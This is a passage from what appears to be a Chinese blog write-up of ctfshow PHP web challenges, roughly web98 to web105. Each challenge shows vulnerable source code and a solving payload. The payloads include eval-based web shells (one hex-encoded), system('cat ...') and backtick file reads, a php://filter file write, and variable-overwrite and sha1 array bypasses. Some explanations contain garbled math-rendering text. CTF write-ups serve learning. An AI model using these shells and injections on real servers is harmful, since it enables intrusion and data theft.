class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="variable">$_GET</span>?<span class="variable">$_GET</span>=&amp;<span class="variable">$_POST</span>:<span class="string">&#x27;flag&#x27;</span>;</span><br><span class="line"><span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>]==<span class="string">&#x27;flag&#x27;</span>?<span class="variable">$_GET</span>=&amp;<span class="variable">$_COOKIE</span>:<span class="string">&#x27;flag&#x27;</span>;</span><br><span class="line"><span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>]==<span class="string">&#x27;flag&#x27;</span>?<span class="variable">$_GET</span>=&amp;<span class="variable">$_SERVER</span>:<span class="string">&#x27;flag&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;HTTP_FLAG&#x27;</span>]==<span class="string">&#x27;flag&#x27;</span>?<span class="variable">$flag</span>:<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><a href="https://www.php.cn/php-weizijiaocheng-383293.html">php三元运算符与if的详解</a></p><p><a href="https://www.php.cn/php-notebook-172859.html">php函数的传值与传址(引用)详解</a></p><p>举例分析：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_GET</span>?<span class="variable">$_GET</span>=&amp;<span class="variable">$_POST</span>:<span class="string">&#x27;flag&#x27;</span>;</span><br><span class="line">===============&gt;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>))&#123;</span><br><span class="line"><span class="variable">$_GET</span>=&amp;<span class="variable">$_POST</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="string">&#x27;flag&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>下面的也是同理</p><p>直到最后一句</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_GET</span>[<span class="string">&#x27;HTTP_FLAG&#x27;</span>]==<span class="string">&#x27;flag&#x27;</span>?<span class="variable">$flag</span>:<span class="keyword">__FILE__</span></span><br><span class="line">==============&gt;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;HTTP_FLAG&#x27;</span>]==<span class="string">&#x27;flag&#x27;</span>)&#123;</span><br><span class="line"><span class="variable">$flag</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">__FILE__</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>既然get传入的值会被定位指向到post所对应的值，那么只需要有get存在即可，同时post传入HTTP_FLAG=flag就可以了</p><h3 id="web99"><a href="#web99" class="headerlink" title="web99"></a>web99</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$allow</span> = <span class="keyword">array</span>();</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">36</span>; <span class="variable">$i</span> &lt; <span class="number">0x36d</span>; <span class="variable">$i</span>++) &#123; </span><br><span class="line">    <span class="title function_ invoke__">array_push</span>(<span class="variable">$allow</span>, <span class="title function_ invoke__">rand</span>(<span class="number">1</span>,<span class="variable">$i</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;n&#x27;</span>]) &amp;&amp; <span class="title function_ invoke__">in_array</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;n&#x27;</span>], <span class="variable">$allow</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;n&#x27;</span>], <span class="variable">$_POST</span>[<span class="string">&#x27;content&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><a href="https://www.runoob.com/php/func-array-push.html">array_push() 函数</a>：向数组尾部插入一个或多个元素</p><p><a href="https://www.runoob.com/php/func-math-rand.html">rand() 函数</a>随机生成数组rand(min,max)</p><p><a href="https://www.runoob.com/php/func-filesystem-file-put-contents.html">file_put_contents() 函数</a>：写入函数</p><p>payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?n=<span class="number">5</span>.php</span><br><span class="line">content=<span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;hack&#x27;</span>]);<span class="meta">?&gt;</span></span><br><span class="line">content=<span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="string">&#x27;cat flag36d.php&#x27;</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="web100"><a href="#web100" class="headerlink" title="web100"></a>web100</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;ctfshow.php&quot;</span>);</span><br><span class="line"><span class="comment">//flag in class ctfshow;</span></span><br><span class="line"><span class="variable">$ctfshow</span> = <span class="keyword">new</span> <span class="title function_ invoke__">ctfshow</span>();</span><br><span class="line"><span class="variable">$v1</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line"><span class="variable">$v2</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line"><span class="variable">$v3</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line"><span class="variable">$v0</span>=<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v1</span>) <span class="keyword">and</span> <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v2</span>) <span class="keyword">and</span> <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v3</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$v0</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;/&quot;</span>, <span class="variable">$v2</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;/&quot;</span>, <span class="variable">$v3</span>))&#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="string">&quot;<span class="subst">$v2</span>(&#x27;ctfshow&#x27;)<span class="subst">$v3</span>&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;    </span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><a href="https://www.jb51.net/article/42425.htm">php中OR与|| AND与&amp;&amp;的区别总结</a></p><p>因为赋值的优先级(=)高于and所以v 0 的 值 可 以 由 v0的值可以由v0的值可以由v1来控制，所以我们需要给其赋值为1也就是true</p><p>因为flag在类ctfshow中，所以可以直接命令执行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?v1=1&amp;v2=var_dump($ctfshow)&amp;v3=;</span><br><span class="line">v1=1&amp;v2=system(&quot;cat ctfshow.php&quot;)/*&amp;v3=*/;</span><br></pre></td></tr></table></figure><h3 id="web101"><a href="#web101" class="headerlink" title="web101"></a>web101</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;ctfshow.php&quot;</span>);</span><br><span class="line"><span class="comment">//flag in class ctfshow;</span></span><br><span class="line"><span class="variable">$ctfshow</span> = <span class="keyword">new</span> <span class="title function_ invoke__">ctfshow</span>();</span><br><span class="line"><span class="variable">$v1</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line"><span class="variable">$v2</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line"><span class="variable">$v3</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line"><span class="variable">$v0</span>=<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v1</span>) <span class="keyword">and</span> <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v2</span>) <span class="keyword">and</span> <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v3</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$v0</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\\\\|\/|\~|\`|\!|\@|\#|\\$|\%|\^|\*|\)|\-|\_|\+|\=|\&#123;|\[|\&quot;|\&#x27;|\,|\.|\;|\?|[0-9]/&quot;</span>, <span class="variable">$v2</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\\\\|\/|\~|\`|\!|\@|\#|\\$|\%|\^|\*|\(|\-|\_|\+|\=|\&#123;|\[|\&quot;|\&#x27;|\,|\.|\?|[0-9]/&quot;</span>, <span class="variable">$v3</span>))&#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="string">&quot;<span class="subst">$v2</span>(&#x27;ctfshow&#x27;)<span class="subst">$v3</span>&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这里牵扯到的是一个反射类的问题</p><p><a href="https://ask.dcloud.net.cn/article/631">php反射类 ReflectionClass使用例子</a></p><p><a href="https://www.huaweicloud.com/articles/12460007.html">PHP的反射类ReflectionClass、ReflectionMethod使用实例</a></p><p><a href="https://learnku.com/articles/7538/the-application-of-reflection-in-php">反射在 PHP 中的应用</a></p><p>看了半天，大概知道了</p><p>反射类可以说成是类的一个映射，可以利用反射类来代替有关类的应用的任何语句</p><p>其属性为类的一个名称，这道题目里面类的名称为ctfshow</p><p><strong>payload：</strong><code>?v1=1&amp;v2=echo new ReflectionClass&amp;v3=;</code></p><p><strong>举个例子</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">hacker</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$hackername</span> = <span class="string">&quot;yn8rt&quot;</span>;</span><br><span class="line"><span class="keyword">const</span>  yn8rt=<span class="string">&#x27;nb666&#x27;</span>;</span><br><span class="line"><span class="keyword">public</span>  <span class="function"><span class="keyword">function</span> <span class="title">show</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;name,<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//有这么一个hacker类，假设我们不知道这个类是干什么用的，我们需要知道类里面的信息，这时候就需要用到ReflectionClass来对类进行反射</span></span><br><span class="line"><span class="comment">//现在我可以通过反射来获取这个类中的方法，属性，常量</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//通过反射获取类的信息</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$reflection</span> = <span class="keyword">new</span> <span class="title class_">ReflectionClass</span>(<span class="string">&#x27;hacker&#x27;</span>);<span class="comment">//实例化反射对象,映射hacker类的信息</span></span><br><span class="line"><span class="variable">$consts</span> = <span class="variable">$reflection</span>-&gt;<span class="title function_ invoke__">getConstants</span>();<span class="comment">//获取所有常量</span></span><br><span class="line"><span class="variable">$props</span> = <span class="variable">$reflection</span>-&gt;<span class="title function_ invoke__">getProperties</span>();<span class="comment">//获取所有属性</span></span><br><span class="line"><span class="variable">$methods</span> = <span class="variable">$reflection</span>-&gt;<span class="title function_ invoke__">getMethods</span>();<span class="comment">//获取所有方法</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$consts</span>);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$props</span>);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$methods</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>返回值</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">array</span>(<span class="number">1</span>) &#123;</span><br><span class="line">  [<span class="string">&quot;yn8rt&quot;</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">5</span>) <span class="string">&quot;nb666&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">array</span>(<span class="number">1</span>) &#123;</span><br><span class="line">  [<span class="number">0</span>]=&gt;</span><br><span class="line">  &amp;<span class="keyword">object</span>(ReflectionProperty)<span class="comment">#2 (2) &#123;</span></span><br><span class="line">    [<span class="string">&quot;name&quot;</span>]=&gt;</span><br><span class="line">    <span class="keyword">string</span>(<span class="number">10</span>) <span class="string">&quot;hackername&quot;</span></span><br><span class="line">    [<span class="string">&quot;class&quot;</span>]=&gt;</span><br><span class="line">    <span class="keyword">string</span>(<span class="number">6</span>) <span class="string">&quot;hacker&quot;</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">array</span>(<span class="number">1</span>) &#123;</span><br><span class="line">  [<span class="number">0</span>]=&gt;</span><br><span class="line">  &amp;<span class="keyword">object</span>(ReflectionMethod)<span class="comment">#3 (2) &#123;</span></span><br><span class="line">    [<span class="string">&quot;name&quot;</span>]=&gt;</span><br><span class="line">    <span class="keyword">string</span>(<span class="number">4</span>) <span class="string">&quot;show&quot;</span></span><br><span class="line">    [<span class="string">&quot;class&quot;</span>]=&gt;</span><br><span class="line">    <span class="keyword">string</span>(<span class="number">6</span>) <span class="string">&quot;hacker&quot;</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果没有指定方法的话，就会像题目中默认输出很多东西：</p><p>1.常量 Contants<br>2.属性 Property Names<br>3.方法 Method Names静态<br>4.属性 Static Properties<br>5.命名空间 Namespace<br>6.Person类是否为final或者abstract<br>7.Person类是否有某个方法</p><h3 id="web102"><a href="#web102" class="headerlink" title="web102"></a>web102</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$v1</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line"><span class="variable">$v2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line"><span class="variable">$v3</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line"><span class="variable">$v4</span> = <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v2</span>) <span class="keyword">and</span> <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v3</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$v4</span>)&#123;</span><br><span class="line">    <span class="variable">$s</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$v2</span>,<span class="number">2</span>);<span class="comment">// 这里的意思是从第二位开始截取</span></span><br><span class="line">    <span class="variable">$str</span> = <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$v1</span>,<span class="variable">$s</span>);<span class="comment">// 回调函数，第一个参数为调用的函数，其余的为调用参数的值</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$str</span>;</span><br><span class="line">    <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$v3</span>,<span class="variable">$str</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><a href="https://www.runoob.com/php/func-string-substr.html">PHP substr() 函数</a></p><p><a href="https://www.runoob.com/php/func-string-hex2bin.html">PHP hex2bin() 函数</a>：参数只有一个，将传入的参数(16进制转换为ascii字符)</p><p>首先还是赋值与and的优先级问题，所以就要保证v2传入的值为经过is_numeric函数判断后返回的结果为true，然后就是利用回调函数来实现读取操作</p><p>所以就可以这么利用啊：</p><p><code>post:v1=hex2bin</code></p><p><code>get：?v2=0x3c3f706870206576616c28245f504f53545b27796e275d293b3f3e&amp;v3=yn.php</code></p><p>上面的16进制解码ascii：<code>&lt;?php eval($_POST[&#39;yn&#39;]);?&gt;</code></p><p>但是有个什么问题：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">is_numeric</span>(<span class="string">&quot;0x66&quot;</span>));<span class="comment">// 在php5中返回值为true</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">is_numeric</span>(<span class="string">&quot;0x66&quot;</span>));<span class="comment">// 在php7中返回值为false</span></span><br></pre></td></tr></table></figure><p>但是本题的环境就是php7啊</p><h4 id="方法二："><a href="#方法二：" class="headerlink" title="方法二："></a>方法二：</h4><p>利用base64，同时配合伪协议去写入，但是需要保证通过is_number函数的判断，可以有字母啊，但是必得是e啊，也就是科学计数法啊，来自同一家的payload啊：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$a</span>=<span class="string">&#x27;&lt;?=`cat *`;&#x27;</span>;</span><br><span class="line"><span class="variable">$b</span>=<span class="title function_ invoke__">base64_encode</span>(<span class="variable">$a</span>);  <span class="comment">// PD89YGNhdCAqYDs=</span></span><br><span class="line"><span class="variable">$c</span>=<span class="title function_ invoke__">bin2hex</span>(<span class="variable">$b</span>);      <span class="comment">//这里直接用去掉=的base64</span></span><br><span class="line">输出   <span class="number">5044383959474e6864434171594473</span></span><br><span class="line"></span><br><span class="line">带e的话会被认为是科学计数法，可以通过is_numeric检测。</span><br><span class="line">大家可以尝试下去掉=和带着=的base64解码出来的内容是相同的。因为等号在base64中只是起到填充的作用，不影响具体的数据内容。</span><br></pre></td></tr></table></figure><p><code>?v2=115044383959474e6864434171594473&amp;v3=php://filter/write=convert.base64-decode/resource=1.php</code></p><p>post：v1=hex2bin</p><p>然后访问1.php去触发就可以了</p><h3 id="web103"><a href="#web103" class="headerlink" title="web103"></a>web103</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$v1</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line"><span class="variable">$v2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line"><span class="variable">$v3</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line"><span class="variable">$v4</span> = <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v2</span>) <span class="keyword">and</span> <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v3</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$v4</span>)&#123;</span><br><span class="line">    <span class="variable">$s</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$v2</span>,<span class="number">2</span>);</span><br><span class="line">    <span class="variable">$str</span> = <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$v1</span>,<span class="variable">$s</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$str</span>;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/.*p.*h.*p.*/i&quot;</span>,<span class="variable">$str</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$v3</span>,<span class="variable">$str</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;Sorry&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这个地方的的匹配似乎毫无意义，只是为了让写入的文件中没有php，但是根据上一个题目的payload来看，也不需要php标签啊</p><h3 id="web104、web106"><a href="#web104、web106" class="headerlink" title="web104、web106"></a>web104、web106</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$v1</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    <span class="variable">$v2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">sha1</span>(<span class="variable">$v1</span>)==<span class="title function_ invoke__">sha1</span>(<span class="variable">$v2</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>没有强制类型转换的话，sha1是无法识别数组的，直接就是数组绕过了</p><h3 id="web105"><a href="#web105" class="headerlink" title="web105"></a>web105</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$error</span>=<span class="string">&#x27;你还想要flag嘛？&#x27;</span>;</span><br><span class="line"><span class="variable">$suces</span>=<span class="string">&#x27;既然你想要那给你吧！&#x27;</span>;</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$key</span>===<span class="string">&#x27;error&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;what are you doing?!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$$key</span>=<span class="variable">$$value</span>;</span><br><span class="line">&#125;<span class="keyword">foreach</span>(<span class="variable">$_POST</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$value</span>===<span class="string">&#x27;flag&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;what are you doing?!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$$key</span>=<span class="variable">$$value</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(!(<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>]==<span class="variable">$flag</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="variable">$error</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;your are good&quot;</span>.<span class="variable">$flag</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">die</span>(<span class="variable">$suces</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">你还想要flag嘛？</span><br></pre></td></tr></table></figure><p>变量覆盖</p><p>首先让k e y = s u c e s 那 么 key=suces那么key=suces那么k e y = key=key=suces，然后v a l u e = f l a g 那 么 value=flag那么value=flag那么v a l u e = value=value=flag，到这里就覆盖成功了，也就是s u c e s = suces=suces=flag</p><p>这里利用的是die(e r r o r ) 来 实 现 的 输 出 ， 所 以 让 error)来实现的输出，所以让error)来实现的输出，所以让key=error那么KaTeX parse error: Can’t use function ‘$’ in math mode at position 5: key=$̲error，$value=su…value=s u c e s ， 也 就 是 suces，也就是suces，也就是error=s u c e s = suces=suces=flag，同时又因为不满足if(!(P O S T [ ′ f l a g ′ ] = = _POST[‘flag’]==P​OST[′flag′]==flag))，所以die被执行，得到flag</p><p><strong>payload</strong><code>?suces=flag，post：error=suces</code></p><h3 id="web107"><a 